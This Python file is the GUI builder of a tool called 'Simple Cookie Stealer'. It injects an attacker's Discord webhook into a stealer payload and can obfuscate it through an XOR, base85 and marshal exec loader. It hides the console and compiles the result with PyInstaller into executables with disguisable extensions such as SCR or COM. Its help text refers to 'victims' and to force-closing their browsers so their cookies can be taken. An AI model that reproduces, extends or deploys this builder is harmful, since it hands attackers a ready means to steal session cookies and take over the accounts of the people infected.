try:
    from tkinter import *
    import customtkinter
    import os
    import ctypes
    import random
    import base64
    import marshal
    import shutil
    import virtualenv
    import requests
    import threading
except ImportError:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, "Please install the required libraries in requirements.txt", "Error", 0)
    exit()

version = "1.0"

webhook = "" # Webhook URL
obfuscate = False # Obfuscate the payload
hideConsole = False # Hide the console when the payload is ran
forceRead = False
virtualenvir = False
inputFileName = "" # Input file name
comboBoxFileType = "EXE" # File type

def build():
    if not os.path.exists("main.py"):
        ctypes.windll.user32.MessageBoxW(0, "main.py not found. Reinstall this program!", "Error", 0)
        return
    
    with open("main.py", "r") as file:
        data = file.read()
    
    _filename = ''.join([random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890") for i in range(10)])
    filename = _filename + "_tmp.py"

    data = data.replace("WEBHOOK GOES HERE", webhook)
    data = data.replace("forceRead = False", f"forceRead = {forceRead}")

    if obfuscate:
        randomXor = random.randint(1, 255)
        data = f"""import os;import json;import base64;import shutil;import sqlite3;import requests;import subprocess;import marshal;from win32crypt import CryptUnprotectData;from Crypto.Cipher import AES;exec(marshal.loads(base64.b85decode(bytes([x^{randomXor} for x in {bytes([x^randomXor for x in base64.b85encode(marshal.dumps(compile(data, "q", "exec")))])}]))))"""

    with open(filename, "w") as file:
        file.write(data)

    if virtualenvir:
        os.system(f"virtualenv {_filename}")
        exec(open(f"{_filename}\\Scripts\\activate_this.py").read(), {'__file__': f"{_filename}\\Scripts\\activate_this.py"})
        os.system(f"{_filename}\\Scripts\\pip install -r requirements.txt")

    scriptsPath = f"{_filename}\\Scripts\x5c" # Apparently you're not allowing to put escaped backslashes at the end of strings, so I had to do the hex thingy.

    os.system(f"{scriptsPath if virtualenvir else ''}pyinstaller --onefile {'--noconsole' if hideConsole else ''} --clean --icon=NONE " + filename)
    os.remove(filename)
    shutil.rmtree("build")
    shutil.copy2("dist\\" + filename.replace(".py", ".exe"), filename.replace(".py", ".exe"))
    shutil.rmtree("dist")
    os.remove(filename.replace(".py", ".spec"))
    if virtualenvir: shutil.rmtree(_filename)
    os.rename(filename.replace(".py", ".exe"), f"{inputFileName}.{comboBoxFileType.lower()}")

class GUI(customtkinter.CTk):

    def __init__(self):
        global version
        super().__init__()

        self.title("Simple Cookie Stealer")
        self.geometry("700x400")
        self.resizable(False, False)
        customtkinter.set_default_color_theme("theme.json")
        customtkinter.set_appearance_mode("Dark")

        GeneralLabel = customtkinter.CTkLabel(master=self, text="Cookie Stealer", font=("Arial", 20))
        GeneralLabel.place(x=5, y=5)

        versionInfo = customtkinter.CTkLabel(master=self, text=f"Simple Cookie Stealer v{version}", font=("Arial", 10))
        versionInfo.place(x=5, y=375)

        self.configButton = customtkinter.CTkButton(master=self, text="Config", width=153, command=self.goToConfig, corner_radius=0, fg_color="#363636", hover_color="#363636")
        self.configButton.place(x=0, y=50)

        self.helpButton = customtkinter.CTkButton(master=self, text="Help", width=153, command=self.goToHelp, corner_radius=0, fg_color="#242424", hover_color="#363636")
        self.helpButton.place(x=0, y=80)

        self.creditsButton = customtkinter.CTkButton(master=self, text="Credits", width=153, command=self.goToCredits, corner_radius=0, fg_color="#242424", hover_color="#363636")
        self.creditsButton.place(x=0, y=110)

        self.configFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)
        self.configFrame.place(x=153, y=0)

        self.helpFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)

        self.creditFrame = customtkinter.CTkFrame(master=self, width=547, height=400, corner_radius=0)

        self.webhookBox = customtkinter.CTkEntry(master=self.configFrame, width=400, placeholder_text="Webhook URL")
        self.webhookBox.place(x=5, y=5)

        self.buildButton = customtkinter.CTkButton(master=self.configFrame, text="Build", width=132, command=self.handleBuildButton)
        self.buildButton.place(x=410, y=5)

        self.boxForceSteal = customtkinter.CTkCheckBox(master=self.configFrame, text="Force Steal", command=self.handleBoxForceRead)
        self.boxObfuscate = customtkinter.CTkCheckBox(master=self.configFrame, text="Obfuscate EXE", command=self.handleBoxObfuscate)
        self.boxHideConsole = customtkinter.CTkCheckBox(master=self.configFrame, text="Hide Console", command=self.handleBoxHideConsole)
        boxVirtualCompiler = customtkinter.CTkCheckBox(master=self.configFrame, text="Virtual Compiling Environment", command=self.handleBoxVirtualCompiler)
        self.inputFileName = customtkinter.CTkEntry(master=self.configFrame, width=200, placeholder_text="Input File Name")
        self.comboBoxFileType = customtkinter.CTkComboBox(master=self.configFrame, width=70, values=["EXE", "SCR", "COM", "BAT", "CMD"], command=self.handleComboBoxFileType)
        self.boxForceSteal.place(x=5, y=40)
        self.boxObfuscate.place(x=5, y=70)
        self.boxHideConsole.place(x=5, y=100)
        boxVirtualCompiler.place(x=5, y=130)
        self.inputFileName.place(x=5, y=160)
        self.comboBoxFileType.place(x=210, y=160)

        self.creditText = customtkinter.CTkTextbox(master=self.creditFrame, width=537, height=390, fg_color="#292929")
        self.creditText.insert(END, f"""Simple Cookie Stealer v{version}

Simple Cookie Stealer and Builder are created and brought to you by DeKrypt.
Offical GitHub Repository: https://github.com/dekrypted/simple-cookie-stealer

Credits:
DeKrypt - GUI Builder
DeKrypt - Cookie Stealer Source
ThePythonCode - Chrome Decryption (https://www.thepythoncode.com/article/extract-chrome-passwords-python)
CustomTkinter - Library for GUI (https://customtkinter.tomschimansky.com/)
PyInstaller - EXE Builder (https://www.pyinstaller.org/)
pycryptodome - pycryptodome library (https://pypi.org/project/pycryptodome/)
pywin32 - pywin32 library (https://pypi.org/project/pywin32/)
requests - requests library (https://pypi.org/project/requests/)
StackOverflow - Find process using file (https://stackoverflow.com/questions/39570207/what-process-is-using-a-given-file)
Python - Programming Language (https://www.python.org/)
                               
And you! Thanks for using Simple Cookie Stealer!
""")
        self.creditText.configure(state=DISABLED)
        self.creditText.place(x=5, y=5)

        self.helpText = customtkinter.CTkTextbox(master=self.helpFrame, width=537, height=390, fg_color="#292929")
        self.helpText.insert(END, """Welcome to Simple Cookie Stealer!
                             
Webhook:
Discord Webhook URL to send the cookies to.

Force Steal:
Some Browsers lock Cookie files. When enabled, it will close Browsers to unlock files. Victim may see this.

Obfuscate EXE:
Obfuscate the EXE file to make it harder to reverse engineer.

Hide Console:
Hide the console when the EXE file is ran.

Virtual Compiling Environment:
Generate a Virtual Python instance to compile the EXE. Smaller file size, but slower compile time.

Yes, I know there isn't much here. It's a SIMPLE Cookie Stealer :)
        """)
        self.helpText.configure(state=DISABLED)
        self.helpText.place(x=5, y=5)

    def goToConfig(self):
        self.configFrame.place(x=153, y=0)
        self.helpFrame.place_forget()
        self.creditFrame.place_forget()
        self.configButton.configure(fg_color="#363636")
        self.helpButton.configure(fg_color="#242424")
        self.creditsButton.configure(fg_color="#242424")
    
    def goToHelp(self):
        self.helpFrame.place(x=153, y=0)
        self.configFrame.place_forget()
        self.creditFrame.place_forget()
        self.helpButton.configure(fg_color="#363636")
        self.configButton.configure(fg_color="#242424")
        self.creditsButton.configure(fg_color="#242424")

    def goToCredits(self):
        self.creditFrame.place(x=153, y=0)
        self.configFrame.place_forget()
        self.helpFrame.place_forget()
        self.configButton.configure(fg_color="#242424")
        self.helpButton.configure(fg_color="#242424")
        self.creditsButton.configure(fg_color="#363636")

    def handleWebhookBox(self):
        global webhook
        webhook = self.webhookBox.get()
    
    def handleInputFileName(self):
        global inputFileName
        inputFileName = self.inputFileName.get()
    
    def handleComboBoxFileType(self, _):
        global comboBoxFileType
        comboBoxFileType = self.comboBoxFileType.get()

    def handleBuildButton(self):
        self.handleWebhookBox()
        self.handleInputFileName()

        self.buildButton.configure(text="Building...")
        self.buildButton.configure(state=DISABLED)
        self.buildButton.update()

        if webhook == "":
            ctypes.windll.user32.MessageBoxW(0, "Please enter a webhook URL.", "Error", 0)
            self.buildButton.configure(text="Build")
            self.buildButton.configure(state=NORMAL)
            self.buildButton.update()
            return

        threading.Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, "Building! This takes a while, please be patient.", "Building", 0)).start()
        build()

        self.buildButton.configure(text="Build")
        self.buildButton.configure(state=NORMAL)
        self.buildButton.update()

        ctypes.windll.user32.MessageBoxW(0, "Build Complete!", "Success", 0)
    
    def handleBoxForceRead(self):
        global forceRead
        forceRead = not forceRead

    def handleBoxVirtualCompiler(self):
        global virtualenvir
        virtualenvir = not virtualenvir
    
    def handleBoxObfuscate(self):
        global obfuscate
        obfuscate = not obfuscate
    
    def handleBoxHideConsole(self):
        global hideConsole
        hideConsole = not hideConsole

gui = GUI()
gui.mainloop()
